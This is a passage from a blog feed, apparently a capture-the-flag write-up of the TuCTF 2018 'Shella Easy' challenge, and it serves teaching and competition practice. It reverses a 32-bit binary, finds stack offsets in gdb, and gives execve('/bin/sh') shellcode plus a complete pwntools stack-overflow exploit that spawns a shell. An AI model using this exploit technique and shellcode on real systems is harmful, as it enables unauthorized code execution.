</code></pre>]]></content></item><item><title>TuCTF 2018 :: Shella Easy</title><link>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</link><pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</guid><description>Reverse Engineering From the file command we can see that it is a dynamically linked linux executable.
$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped Running checksec on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>From the <code>file</code> command we can see that it is a dynamically linked linux executable.</p>
<pre><code>$ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
</code></pre><p>Running <code>checksec</code> on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</p>
<pre><code>$ checksec ./shella-easy
[*] './shella-easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre><p>This means a few things for us:</p>
<ul>
<li>We know where everything is stored inside the binary.</li>
<li>We can execute arbitrary shellcode on the stack.</li>
<li>A stack overflow can give us control over program execution.</li>
</ul>
<p>Running <code>shella-easy</code> shows that the binary (at some point) takes user input. We&rsquo;ll need to reverse it in order to understand how it does this, but it is a potential avenue for exploitation.</p>
<pre><code>$ ./shella-easy
I'll have a 0xffc40780 with a side of fries thanks
asdfasdf
</code></pre><p>Reversing the <code>main</code> function of the binary reveals that it uses <code>gets</code> to take user input. As we suspected, this is likely where we can exploit this.</p>
<pre><code>0x08048532      83c408         add esp, 8
0x08048535      8d45b8         lea eax, [s]
0x08048538      50             push eax                    ; char *s
0x08048539      e852feffff     call sym.imp.gets           ; char *gets(char *s)
</code></pre><p>Another important thing to note, is that the binary does have some protections in place against stack overflows; if the variable <code>var_8h</code> is not set to <code>0xdeadbeef</code>, the binary will immediately exit (instead of returning and giving us control).</p>
<pre><code>    0x08048541      817df8efbead.  cmp dword [var_8h], 0xdeadbeef
тФМтФА&lt; 0x08048548      7407           je 0x8048551
тФВ   0x0804854a      6a00           push 0                      ; int status
тФВ   0x0804854c      e84ffeffff     call sym.imp.exit           ; void exit(int status)
тФФтФА&gt; 0x08048551      b800000000     mov eax, 0
    0x08048556      8b5dfc         mov ebx, dword [var_4h]
    0x08048559      c9             leave
    0x0804855a      c3             ret
</code></pre><p>We can also see that this variable <code>var_8h</code> is initially set to a value of <code>0xcafebabe</code> higher up in the instruction stream.</p>
<pre><code>0x0804851b      c745f8bebafe.  mov dword [var_8h], 0xcafebabe
</code></pre><p>We&rsquo;ll want to find out where <code>var_8h</code> is stored relative to where our input <code>s</code> is stored, so we can overwrite the value of it in order to bypass this check (when we perform our overflow).</p>
<p>Radare tells us a little about where these variables are supposed to be stored (in the <code>main</code> function header), but we&rsquo;ll want to verify this later.</p>
<pre><code>; var char *s @ ebp-0x48
; var uint32_t var_8h @ ebp-0x8
; var int32_t var_4h @ ebp-0x4
</code></pre><p>We can see that the <code>var_8h</code> is stored below our input buffer <code>s</code> on the stack, this is good for us as we can overwrite its value when we perform our overflow.</p>
<p>A quick calculation <code>0x48 - 0x8 = 0x40 = 64</code> tells us that <code>var_8h</code> is stored 64 bytes after the start of our input buffer.</p>
<h2 id="information-gathering">Information Gathering</h2>
<p>First, let&rsquo;s spin up GDB and verify the location of <code>var_8h</code> relative to our input buffer <code>s</code>.</p>
<p>We&rsquo;ll set a breakpoint just after the <code>gets</code> call so we can see what the stack looks like just after we&rsquo;ve provided the binary with input.</p>
<pre><code>pwndbg&gt; disassemble main
Dump of assembler code for function main:

...

   0x08048539 &lt;+94&gt;:    call   0x8048390 &lt;gets@plt&gt;
   0x0804853e &lt;+99&gt;:    add    esp,0x4
   0x08048541 &lt;+102&gt;:   cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   0x08048548 &lt;+109&gt;:   je     0x8048551 &lt;main+118&gt;
   0x0804854a &lt;+111&gt;:   push   0x0
   0x0804854c &lt;+113&gt;:   call   0x80483a0 &lt;exit@plt&gt;
   0x08048551 &lt;+118&gt;:   mov    eax,0x0
   0x08048556 &lt;+123&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048559 &lt;+126&gt;:   leave  
   0x0804855a &lt;+127&gt;:   ret    

...

pwndbg&gt; b *0x0804853e
Breakpoint 1 at 0x804853e
</code></pre><p>We can now run the binary inside GDB and we&rsquo;ll give it the value <code>AAAA</code> when it prompts us for input, so we can easily see where our input is stored inside the stack.</p>
<pre><code>pwndbg&gt; r
Starting program: ./shella-easy 
Yeah I'll have a 0xffffcff0 with a side of fries thanks
AAAA

Breakpoint 1, 0x0804853e in main ()

...
</code></pre><p>After dumping the relevant part of the stack, we can verify the location of <code>var_8h</code> relative to <code>s</code> with a simple calculation; <code>0xffffd030 - 0xffffcff0 = 64</code>.</p>
<pre><code>pwndbg&gt; x/20x $ebp-0x48
0xffffcff0:     0x41414141      0xf7fe3200      0x00000000      0xf7e02c1e
0xffffd000:     0xf7fb03fc      0xffffffff      0x00000000      0x080485ab
0xffffd010:     0x00000001      0xffffd0e4      0xffffd0ec      0x08048581
0xffffd020:     0xf7fe3230      0x00000000      0x08048569      0x00000000
0xffffd030:     0xcafebabe      0x00000000      0x00000000      0xf7de9e46
</code></pre><p>While we&rsquo;re at this breakpoint, we can also take a look at what the binary is leaking. Yep, it&rsquo;s definitely the location of our input buffer on the stack, this will make the exploitation process a lot easier.</p>
<pre><code>pwndbg&gt; x/x 0xffffcff0
0xffffcff0:     0x41414141
</code></pre><p>Now let&rsquo;s find the location of the function&rsquo;s return address stored on the stack relative to our input buffer.</p>
<p>We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the <code>var_8h</code> variable overwritten with <code>0xdeadbeef</code>) that we can use to determine the location of the return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>
var <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./shella-easy&#39;</span>)
gdb<span style="color:#f92672">.</span>debug(r)

r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> var <span style="color:#f92672">+</span> cyclic(<span style="color:#ae81ff">64</span>))
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>We know that the program should crash once we&rsquo;ve overwritten the return address with our bad data. So printing the value of <code>$eip</code> after the crash should give us the bytes that the return address was overwritten with.</p>
<pre><code>pwndbg&gt; p $eip
$1 = (void (*)()) 0x61616163
</code></pre><p>We can use pwntools' <code>cyclic_find</code> function and the bytes contained within <code>eip</code> above, in order to find the offset of the return address from the end of our payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x61616163</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">8</span>
</code></pre></div><h2 id="exploit-development">Exploit Development</h2>
<p>Now that we know the location of <code>var_8h</code> and the return address relative to our input buffer we can begin to craft our exploit.</p>
<p>We know that we can execute arbitrary code within the stack, so let&rsquo;s write up some quick shellcode to give us an interactive shell.</p>
<pre><code>.global _start

_start:
.intel_syntax noprefix
shell:
    push 0x0068732f     # &quot;/sh&quot;
    push 0x6e69622f     # &quot;/bin&quot;
    mov ebx, esp        # &quot;/bin/sh&quot;
    mov ecx, 0
    mov edx, 0
    mov eax, 11
    int 0x80            # execve(&quot;/bin/sh&quot;, 0, 0)
exit:
    mov ebx, 0          # exit code
    mov eax, 0
    int 0x80            # exit(0)
</code></pre><p>Let&rsquo;s compile our shellcode, and get a representation of it that we can use in our exploit code.</p>
<pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">1</span>]: open(<span style="color:#e6db74">&#39;payload&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
Out[<span style="color:#ae81ff">1</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">h/bin</span><span style="color:#ae81ff">\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80</span><span style="color:#e6db74">&#39;</span>
</code></pre></div><p>Now we can build our exploit. Here is an outline of what we want to achieve:</p>
<ul>
<li>Capture the leaked stack address.</li>
<li>Overwrite <code>var_8h</code> with <code>0xdeadbeef</code>.</li>
<li>Overwrite the return address using the leak.</li>
<li>Get code execution.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">h/bin</span><span style="color:#ae81ff">\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80</span><span style="color:#e6db74">&#39;</span>

pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">64</span> <span style="color:#f92672">-</span> len(buf))
var <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
off <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./shella-easy&#39;</span>)
<span style="color:#75715e">#gdb.attach(r)</span>

<span style="color:#75715e"># capture the leaked stack address</span>
r<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">&#39;Yeah I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">ll have a &#39;</span>)
leak <span style="color:#f92672">=</span> p32(eval(r<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">10</span>)))
r<span style="color:#f92672">.</span>clean()

<span style="color:#75715e"># send our payload to the binary</span>
r<span style="color:#f92672">.</span>writeline(buf <span style="color:#f92672">+</span> pad <span style="color:#f92672">+</span> var <span style="color:#f92672">+</span> off <span style="color:#f92672">+</span> leak)
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>And finally, here&rsquo;s the exploit in action.</p>
<pre><code>./exploit.py 
[+] Starting local process './shella-easy': pid 3768
[*] Switching to interactive mode
$ cat flag.txt
TuCTF{Shella Easy}
</code></pre>]]></content></item></channel></rss>